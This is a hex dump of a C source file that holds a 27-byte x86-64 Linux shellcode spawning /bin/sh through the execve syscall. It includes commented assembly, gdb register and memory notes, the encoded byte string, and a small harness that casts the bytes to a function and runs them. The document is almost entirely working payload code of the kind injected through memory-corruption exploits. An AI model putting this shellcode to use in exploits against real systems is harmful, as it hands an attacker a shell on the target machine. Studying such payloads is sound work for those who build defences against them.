00000000  2f 2a 0d 0a 20 2a 20 45  78 65 63 75 74 65 20 2f  |/*.. * Execute /|
00000010  62 69 6e 2f 73 68 20 2d  20 32 37 20 62 79 74 65  |bin/sh - 27 byte|
00000020  73 0d 0a 20 2a 20 44 61  64 60 20 3c 33 20 62 61  |s.. * Dad` <3 ba|
00000030  62 6f 6f 6e 0d 0a 3b 72  64 69 20 20 20 20 20 20  |boon..;rdi      |
00000040  20 20 20 20 20 20 30 78  34 30 30 35 63 34 20 30  |      0x4005c4 0|
00000050  78 34 30 30 35 63 34 0d  0a 3b 72 73 69 20 20 20  |x4005c4..;rsi   |
00000060  20 20 20 20 20 20 20 20  20 30 78 37 66 66 66 66  |         0x7ffff|
00000070  66 66 66 64 66 34 30 20  20 20 30 78 37 66 66 66  |fffdf40   0x7fff|
00000080  66 66 66 66 64 66 34 30  0d 0a 3b 72 64 78 20 20  |ffffdf40..;rdx  |
00000090  20 20 20 20 20 20 20 20  20 20 30 78 30 20 20 20  |          0x0   |
000000a0  20 20 20 30 78 30 0d 0a  3b 67 64 62 24 20 78 2f  |   0x0..;gdb$ x/|
000000b0  73 20 24 72 64 69 0d 0a  3b 30 78 34 30 30 35 63  |s $rdi..;0x4005c|
000000c0  34 3a 20 20 20 20 20 20  20 20 22 2f 62 69 6e 2f  |4:        "/bin/|
000000d0  73 68 22 0d 0a 3b 67 64  62 24 20 78 2f 73 20 24  |sh"..;gdb$ x/s $|
000000e0  72 73 69 0d 0a 3b 30 78  37 66 66 66 66 66 66 66  |rsi..;0x7fffffff|
000000f0  64 66 34 30 3a 20 20 22  5c 33 30 34 5c 30 30 35  |df40:  "\304\005|
00000100  40 22 0d 0a 3b 67 64 62  24 20 78 2f 33 32 78 62  |@"..;gdb$ x/32xb|
00000110  20 24 72 73 69 0d 0a 3b  30 78 37 66 66 66 66 66  | $rsi..;0x7fffff|
00000120  66 66 64 66 34 30 3a 20  30 78 63 34 20 20 20 20  |ffdf40: 0xc4    |
00000130  30 78 30 35 20 20 20 20  30 78 34 30 20 20 20 20  |0x05    0x40    |
00000140  30 78 30 30 20 20 20 20  30 78 30 30 20 20 20 20  |0x00    0x00    |
*
00000160  30 78 30 30 0d 0a 3b 30  78 37 66 66 66 66 66 66  |0x00..;0x7ffffff|
00000170  66 64 66 34 38 3a 20 30  78 30 30 20 20 20 20 30  |fdf48: 0x00    0|
00000180  78 30 30 20 20 20 20 30  78 30 30 20 20 20 20 30  |x00    0x00    0|
*
000001b0  78 30 30 0d 0a 3b 30 78  37 66 66 66 66 66 66 66  |x00..;0x7fffffff|
000001c0  64 66 35 30 3a 20 30 78  30 30 20 20 20 20 30 78  |df50: 0x00    0x|
000001d0  30 30 20 20 20 20 30 78  30 30 20 20 20 20 30 78  |00    0x00    0x|
*
00000200  30 30 0d 0a 3b 30 78 37  66 66 66 66 66 66 66 64  |00..;0x7fffffffd|
00000210  66 35 38 3a 20 30 78 35  35 20 20 20 20 30 78 62  |f58: 0x55    0xb|
00000220  34 20 20 20 20 30 78 61  35 20 20 20 20 30 78 66  |4    0xa5    0xf|
00000230  37 20 20 20 20 30 78 66  66 20 20 20 20 30 78 37  |7    0xff    0x7|
00000240  66 20 20 20 20 30 78 30  30 20 20 20 20 30 78 30  |f    0x00    0x0|
00000250  30 0d 0a 3b 0d 0a 3b 3d  3e 20 30 78 37 66 66 66  |0..;..;=> 0x7fff|
00000260  66 37 61 65 66 66 32 30  20 3c 65 78 65 63 76 65  |f7aeff20 <execve|
00000270  3e 3a 20 20 20 20 20 6d  6f 76 20 20 20 20 65 61  |>:     mov    ea|
00000280  78 2c 30 78 33 62 0d 0a  3b 20 20 20 30 78 37 66  |x,0x3b..;   0x7f|
00000290  66 66 66 37 61 65 66 66  32 35 20 3c 65 78 65 63  |fff7aeff25 <exec|
000002a0  76 65 2b 35 3e 3a 20 20  20 73 79 73 63 61 6c 6c  |ve+5>:   syscall|
000002b0  20 0d 0a 3b 0d 0a 0d 0a  6d 61 69 6e 3a 0d 0a 20  | ..;....main:.. |
000002c0  20 20 20 3b 6d 6f 76 20  72 62 78 2c 20 30 78 36  |   ;mov rbx, 0x6|
000002d0  38 37 33 32 66 36 65 36  39 36 32 32 66 32 66 0d  |8732f6e69622f2f.|
000002e0  0a 20 20 20 20 3b 6d 6f  76 20 72 62 78 2c 20 30  |.    ;mov rbx, 0|
000002f0  78 36 38 37 33 32 66 36  65 36 39 36 32 32 66 66  |x68732f6e69622ff|
00000300  66 0d 0a 20 20 20 20 3b  73 68 72 20 72 62 78 2c  |f..    ;shr rbx,|
00000310  20 30 78 38 0d 0a 20 20  20 20 3b 6d 6f 76 20 72  | 0x8..    ;mov r|
00000320  61 78 2c 20 30 78 64 65  61 64 62 65 65 66 63 61  |ax, 0xdeadbeefca|
00000330  66 65 31 64 65 61 0d 0a  20 20 20 20 3b 6d 6f 76  |fe1dea..    ;mov|
00000340  20 72 62 78 2c 20 30 78  64 65 61 64 62 65 65 66  | rbx, 0xdeadbeef|
00000350  63 61 66 65 31 64 65 61  0d 0a 20 20 20 20 3b 6d  |cafe1dea..    ;m|
00000360  6f 76 20 72 63 78 2c 20  30 78 64 65 61 64 62 65  |ov rcx, 0xdeadbe|
00000370  65 66 63 61 66 65 31 64  65 61 0d 0a 20 20 20 20  |efcafe1dea..    |
00000380  3b 6d 6f 76 20 72 64 78  2c 20 30 78 64 65 61 64  |;mov rdx, 0xdead|
00000390  62 65 65 66 63 61 66 65  31 64 65 61 0d 0a 20 20  |beefcafe1dea..  |
000003a0  20 20 78 6f 72 20 65 61  78 2c 20 65 61 78 0d 0a  |  xor eax, eax..|
000003b0  20 20 20 20 6d 6f 76 20  72 62 78 2c 20 30 78 46  |    mov rbx, 0xF|
000003c0  46 39 37 38 43 44 30 39  31 39 36 39 44 44 31 0d  |F978CD091969DD1.|
000003d0  0a 20 20 20 20 6e 65 67  20 72 62 78 0d 0a 20 20  |.    neg rbx..  |
000003e0  20 20 70 75 73 68 20 72  62 78 0d 0a 20 20 20 20  |  push rbx..    |
000003f0  3b 6d 6f 76 20 72 64 69  2c 20 72 73 70 0d 0a 20  |;mov rdi, rsp.. |
00000400  20 20 20 70 75 73 68 20  72 73 70 0d 0a 20 20 20  |   push rsp..   |
00000410  20 70 6f 70 20 72 64 69  0d 0a 20 20 20 20 63 64  | pop rdi..    cd|
00000420  71 0d 0a 20 20 20 20 70  75 73 68 20 72 64 78 0d  |q..    push rdx.|
00000430  0a 20 20 20 20 70 75 73  68 20 72 64 69 0d 0a 20  |.    push rdi.. |
00000440  20 20 20 3b 6d 6f 76 20  72 73 69 2c 20 72 73 70  |   ;mov rsi, rsp|
00000450  0d 0a 20 20 20 20 70 75  73 68 20 72 73 70 0d 0a  |..    push rsp..|
00000460  20 20 20 20 70 6f 70 20  72 73 69 0d 0a 20 20 20  |    pop rsi..   |
00000470  20 6d 6f 76 20 61 6c 2c  20 30 78 33 62 0d 0a 20  | mov al, 0x3b.. |
00000480  20 20 20 73 79 73 63 61  6c 6c 0d 0a 20 2a 2f 0d  |   syscall.. */.|
00000490  0a 0d 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 64  |...#include <std|
000004a0  69 6f 2e 68 3e 0d 0a 23  69 6e 63 6c 75 64 65 20  |io.h>..#include |
000004b0  3c 73 74 72 69 6e 67 2e  68 3e 0d 0a 0d 0a 63 68  |<string.h>....ch|
000004c0  61 72 20 63 6f 64 65 5b  5d 20 3d 20 22 5c 78 33  |ar code[] = "\x3|
000004d0  31 5c 78 63 30 5c 78 34  38 5c 78 62 62 5c 78 64  |1\xc0\x48\xbb\xd|
000004e0  31 5c 78 39 64 5c 78 39  36 5c 78 39 31 5c 78 64  |1\x9d\x96\x91\xd|
000004f0  30 5c 78 38 63 5c 78 39  37 5c 78 66 66 5c 78 34  |0\x8c\x97\xff\x4|
00000500  38 5c 78 66 37 5c 78 64  62 5c 78 35 33 5c 78 35  |8\xf7\xdb\x53\x5|
00000510  34 5c 78 35 66 5c 78 39  39 5c 78 35 32 5c 78 35  |4\x5f\x99\x52\x5|
00000520  37 5c 78 35 34 5c 78 35  65 5c 78 62 30 5c 78 33  |7\x54\x5e\xb0\x3|
00000530  62 5c 78 30 66 5c 78 30  35 22 3b 0d 0a 0d 0a 69  |b\x0f\x05";....i|
00000540  6e 74 20 6d 61 69 6e 28  29 0d 0a 7b 0d 0a 20 20  |nt main()..{..  |
00000550  20 20 70 72 69 6e 74 66  28 22 6c 65 6e 3a 25 64  |  printf("len:%d|
00000560  20 62 79 74 65 73 5c 6e  22 2c 20 73 74 72 6c 65  | bytes\n", strle|
00000570  6e 28 63 6f 64 65 29 29  3b 0d 0a 20 20 20 20 28  |n(code));..    (|
00000580  2a 28 76 6f 69 64 28 2a  29 28 29 29 20 63 6f 64  |*(void(*)()) cod|
00000590  65 29 28 29 3b 0d 0a 20  20 20 20 72 65 74 75 72  |e)();..    retur|
000005a0  6e 20 30 3b 0d 0a 7d                              |n 0;..}|
000005a7
